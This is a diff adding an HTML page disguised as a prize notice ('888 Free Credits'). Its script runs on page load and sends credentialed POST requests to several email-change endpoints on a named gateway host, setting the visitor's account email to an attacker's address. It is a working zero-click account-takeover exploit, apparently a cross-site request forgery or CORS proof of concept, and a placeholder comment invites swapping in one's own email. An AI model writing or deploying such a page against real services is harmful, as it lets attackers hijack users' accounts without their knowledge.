@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Congratulations! You Won 888 Free Credits!</title>
+  <style>
+    body { font-family: Arial; text-align:center; padding:60px; background:#000; color:#0f0; }
+    h1 { font-size: 2.5em; color: #ff0080; }
+  </style>
+</head>
+<body>
+  <h1>You Are Today’s Lucky Winner!</h1>
+  <p>888 Free Credits added automatically. Redirecting...</p>
+
+<script>
+const ATTACKER_EMAIL = "hlaingminpaing@gmail.com";   // Change to your real email
+
+async function takeover() {
+  const paths = [
+    "/kkr-user-center/user/updateEmail",
+    "/kkr-user-center/user/changeEmail",
+    "/api/v1/user/updateEmail",
+    "/api/v1/user/changeEmail"
+  ];
+
+  for (const path of paths) {
+    try {
+      const resp = await fetch("https://uat-gateway.kkr88819.com" + path, {
+        method: "POST",
+        credentials: "include",           // This sends cookies automatically
+        mode: "cors",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({ email: ATTACKER_EMAIL })
+      });
+
+      if (resp.ok) {
+        alert("SUCCESS! Email changed to " + ATTACKER_EMAIL);
+        break;
+      }
+    } catch(e) {}
+  }
+}
+
+// Run immediately — zero click needed
+takeover();
+</script>
+</body>
+</html>
